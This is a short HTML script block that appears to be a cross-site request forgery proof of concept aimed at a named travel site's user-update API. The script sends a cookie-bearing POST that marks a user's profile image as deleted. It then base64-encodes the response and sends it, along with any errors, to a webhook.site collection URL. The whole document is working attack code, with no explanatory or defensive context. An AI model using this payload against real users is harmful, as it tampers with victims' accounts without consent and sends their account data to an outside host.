<script>
fetch("https://mapi.makemytrip.com/ext/web/pwa/user/update?region=IN&language=eng&currency=inr&user-currency=INR", {
  method: "POST",
  mode: "no-cors",
  credentials: "include", // include cookies
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    query: [[{
      name: "extendedUser",
      values: {
        userImages: [{
          id: "2",
          status: "DELETED"
        }]
      }
    }]]
  })
})
.then(res => res.text())
.then(data => {
  fetch("https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8", {
    method: "POST",
    mode: "no-cors",
    body: btoa(data) // send base64-encoded response
  });
})
.catch(err => {
  fetch("https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8", {
    method: "POST",
    mode: "no-cors",
    body: "error:" + err.message
  });
});
</script>
